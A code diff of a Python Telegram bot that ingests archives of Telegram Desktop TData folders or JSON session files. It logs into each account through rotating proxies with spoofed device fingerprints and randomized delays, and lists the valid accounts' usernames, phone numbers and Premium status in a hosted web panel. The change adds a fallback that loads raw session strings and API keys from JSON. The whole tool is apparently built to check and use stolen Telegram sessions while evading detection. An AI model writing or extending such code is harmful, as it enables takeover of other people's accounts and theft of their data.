@@ -10,7 +10,7 @@ from datetime import datetime
 from urllib.parse import urlparse
 
 from aiogram import Bot, Dispatcher, F
-from aiogram.types import Message, WebAppInfo, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.types import Message, WebAppInfo, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
 from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
@@ -85,14 +85,7 @@ def get_ip_country(ip):
     except: pass
     return "UNKNOWN"
 
-def find_tdata_folders(base_path):
-    folders = []
-    for root, dirs, files in os.walk(base_path):
-        if "key_d" in files:
-            folders.append(root)
-    return folders
-
-# --- API ДЛЯ ВЕБ-ПАНЕЛИ ---
+# --- API И ВСТРОЕННАЯ ПАНЕЛЬ ---
 @web.middleware
 async def cors_middleware(request, handler):
     if request.method == 'OPTIONS':
@@ -111,7 +104,6 @@ async def handle_get_premium_link(request):
     if not acc: return web.json_response({"status": "error", "message": "Не найден"}, status=404)
     return web.json_response({"status": "ok", "premium_url": "https://t.me/PremiumBot", "proxy": acc.get("proxy", "Нет"), "country": acc.get("proxy_country", "UNKNOWN")})
 
-# --- ВСТРОЕННЫЙ HTML ВЕБ-ПАНЕЛИ ---
 async def handle_index(request):
     html_content = """
     <!DOCTYPE html>
@@ -265,69 +257,120 @@ async def process_proxies(message: Message, state: FSMContext):
         return await msg.edit_text("❌ Список прокси пуст. Начни заново /start")
         
     accounts = []
-    folders = find_tdata_folders(TDATA_DIR)
-    
-    if not folders:
-        return await msg.edit_text("❌ Не найдены файлы TData (key_d) в архиве. Проверь структуру ZIP.")
-    
-    for i, folder in enumerate(folders):
-        acc_id = os.path.basename(folder) 
-        device = get_sticky_device(acc_id)
-        
-        acc_info = {
-            "id": acc_id, "username": "Ошибка", "first_name": "", "phone": "N/A", 
-            "country": "Неизвестно", "ip": "N/A", "proxy_country": "UNKNOWN", 
-            "time": datetime.now().strftime("%H:%M"), "premium": False, 
-            "premium_expires": "Нет", "valid": False, 
-            "device": f"{device['model']} ({device['system']})", "proxy": "Нет"
-        }
-        
-        await asyncio.sleep(random.uniform(2.0, 4.0))
-        
-        try:
-            acc = read_tdata(folder)
-            session_string = acc.to_string_session()
-            temp_proxy = random.choice(proxy_list)
+    processed_ids = set()
+
+    # 1. Сначала пробуем найти стандартные папки TData (с key_d)
+    for root, dirs, files in os.walk(TDATA_DIR):
+        if "key_d" in files or "key_datas" in files:
+            folder_name = os.path.basename(root)
+            if folder_name in processed_ids: continue
             
-            client = TelegramClient(StringSession(session_string), acc.api_id, acc.api_hash, device_model=device['model'], system_version=device['system'], app_version=device['app'], proxy=temp_proxy['tuple'])
-            await client.connect()
+            device = get_sticky_device(folder_name)
+            acc_info = {
+                "id": folder_name, "username": "Ошибка", "first_name": "", "phone": "N/A", 
+                "country": "Неизвестно", "ip": "N/A", "proxy_country": "UNKNOWN", 
+                "time": datetime.now().strftime("%H:%M"), "premium": False, 
+                "premium_expires": "Нет", "valid": False, 
+                "device": f"{device['model']} ({device['system']})", "proxy": "Нет"
+            }
             
-            if await client.is_user_authorized():
-                me = await client.get_me()
-                acc_info["username"] = me.username or me.first_name or "Без юзернейма"
-                acc_info["first_name"] = me.first_name or ""
-                acc_info["phone"] = f"+{me.phone}" if me.phone else "Скрыт"
-                acc_info["valid"] = True
+            await asyncio.sleep(random.uniform(1.0, 3.0))
+            try:
+                acc = read_tdata(root)
+                session_string = acc.to_string_session()
+                temp_proxy = random.choice(proxy_list)
+                client = TelegramClient(StringSession(session_string), acc.api_id, acc.api_hash, device_model=device['model'], system_version=device['system'], app_version=device['app'], proxy=temp_proxy['tuple'])
+                await client.connect()
                 
-                full_user = await client(GetFullUserRequest(me.id))
-                if full_user.full_user.premium_expires:
-                    acc_info["premium"] = True
-                    acc_info["premium_expires"] = datetime.fromtimestamp(full_user.full_user.premium_expires).strftime("%d.%m.%Y")
-                
-                if me.phone: acc_info["country"] = "UA" if me.phone.startswith("380") else "RU" if me.phone.startswith("7") else "US"
-                
-                matching_proxies = [p for p in proxy_list if p["country"] == acc_info["country"]]
-                chosen_proxy = random.choice(matching_proxies) if matching_proxies else temp_proxy
-                acc_info["proxy"] = chosen_proxy["raw"]
-                acc_info["proxy_country"] = chosen_proxy["country"]
-                acc_info["ip"] = chosen_proxy["tuple"][1]
+                if await client.is_user_authorized():
+                    me = await client.get_me()
+                    acc_info.update({
+                        "username": me.username or me.first_name or "Без юзернейма",
+                        "first_name": me.first_name or "",
+                        "phone": f"+{me.phone}" if me.phone else "Скрыт",
+                        "valid": True
+                    })
+                    full_user = await client(GetFullUserRequest(me.id))
+                    if full_user.full_user.premium_expires:
+                        acc_info["premium"] = True
+                        acc_info["premium_expires"] = datetime.fromtimestamp(full_user.full_user.premium_expires).strftime("%d.%m.%Y")
+                    
+                    if me.phone: acc_info["country"] = "UA" if me.phone.startswith("380") else "RU" if me.phone.startswith("7") else "US"
+                    matching_proxies = [p for p in proxy_list if p["country"] == acc_info["country"]]
+                    chosen_proxy = random.choice(matching_proxies) if matching_proxies else temp_proxy
+                    acc_info.update({"proxy": chosen_proxy["raw"], "proxy_country": chosen_proxy["country"], "ip": chosen_proxy["tuple"][1]})
                 await client.disconnect()
-            else:
-                acc_info["username"] = "Не авторизован"
-                await client.disconnect()
-        except Exception as e:
-            print(f"ОШИБКА АККАУНТА {acc_id}: {e}")
-            acc_info["username"] = f"Ошибка: {str(e)[:30]}"
+            except Exception as e:
+                print(f"ОШИБКА TData {folder_name}: {e}")
+                acc_info["username"] = f"Ошибка: {str(e)[:30]}"
             
-        accounts.append(acc_info)
-        save_json(ACCOUNTS_FILE, accounts)
-        
+            accounts.append(acc_info)
+            processed_ids.add(folder_name)
+            save_json(ACCOUNTS_FILE, accounts)
+
+    # 2. Если TData не найдены, ищем JSON-файлы с сессиями
+    if not accounts:
+        for root, dirs, files in os.walk(TDATA_DIR):
+            for file in files:
+                if file.endswith(".json"):
+                    json_path = os.path.join(root, file)
+                    acc_id = file.replace(".json", "")
+                    if acc_id in processed_ids: continue
+                    
+                    try:
+                        with open(json_path, "r", encoding="utf-8") as f: data = json.load(f)
+                        session_str = data.get("session_string") or data.get("session")
+                        api_id = data.get("api_id")
+                        api_hash = data.get("api_hash")
+                        if not session_str or not api_id or not api_hash: continue
+                    except: continue
+                        
+                    device = get_sticky_device(acc_id)
+                    acc_info = {
+                        "id": acc_id, "username": "Ошибка", "first_name": "", "phone": "N/A", 
+                        "country": "Неизвестно", "ip": "N/A", "proxy_country": "UNKNOWN", 
+                        "time": datetime.now().strftime("%H:%M"), "premium": False, 
+                        "premium_expires": "Нет", "valid": False, 
+                        "device": f"{device['model']} ({device['system']})", "proxy": "Нет"
+                    }
+                    
+                    await asyncio.sleep(random.uniform(1.0, 3.0))
+                    try:
+                        temp_proxy = random.choice(proxy_list)
+                        client = TelegramClient(StringSession(session_str), api_id, api_hash, device_model=device['model'], system_version=device['system'], app_version=device['app'], proxy=temp_proxy['tuple'])
+                        await client.connect()
+                        
+                        if await client.is_user_authorized():
+                            me = await client.get_me()
+                            acc_info.update({
+                                "username": me.username or me.first_name or "Без юзернейма",
+                                "first_name": me.first_name or "",
+                                "phone": f"+{me.phone}" if me.phone else "Скрыт",
+                                "valid": True
+                            })
+                            full_user = await client(GetFullUserRequest(me.id))
+                            if full_user.full_user.premium_expires:
+                                acc_info["premium"] = True
+                                acc_info["premium_expires"] = datetime.fromtimestamp(full_user.full_user.premium_expires).strftime("%d.%m.%Y")
+                            
+                            if me.phone: acc_info["country"] = "UA" if me.phone.startswith("380") else "RU" if me.phone.startswith("7") else "US"
+                            matching_proxies = [p for p in proxy_list if p["country"] == acc_info["country"]]
+                            chosen_proxy = random.choice(matching_proxies) if matching_proxies else temp_proxy
+                            acc_info.update({"proxy": chosen_proxy["raw"], "proxy_country": chosen_proxy["country"], "ip": chosen_proxy["tuple"][1]})
+                        await client.disconnect()
+                    except Exception as e:
+                        print(f"ОШИБКА JSON {acc_id}: {e}")
+                        acc_info["username"] = f"Ошибка: {str(e)[:30]}"
+                    
+                    accounts.append(acc_info)
+                    processed_ids.add(acc_id)
+                    save_json(ACCOUNTS_FILE, accounts)
+
     await msg.delete()
     
     if not accounts:
-        return await message.answer("❌ Не удалось обработать ни одного аккаунта.")
+        return await message.answer("❌ Не удалось обработать ни одного аккаунта. Проверь формат архива.")
         
-    # Отправляем кнопку для открытия ВЕБ-ПАНЕЛИ
     web_app = WebAppInfo(url="https://worker-production-578b44ee.up.railway.app/")
     kb = ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="💎 Открыть панель", web_app=web_app)]], resize_keyboard=True)
     
@@ -337,7 +380,7 @@ async def main():
     app = web.Application(client_max_size=1024**3, middlewares=[cors_middleware])
     app.router.add_get('/api/accounts', handle_get_accounts)
     app.router.add_get('/api/get_premium_link', handle_get_premium_link)
-    app.router.add_get('/', handle_index) # Отдаем HTML прямо с Railway
+    app.router.add_get('/', handle_index)
     runner = web.AppRunner(app)
     await runner.setup()
     site = web.TCPSite(runner, '0.0.0.0', PORT)
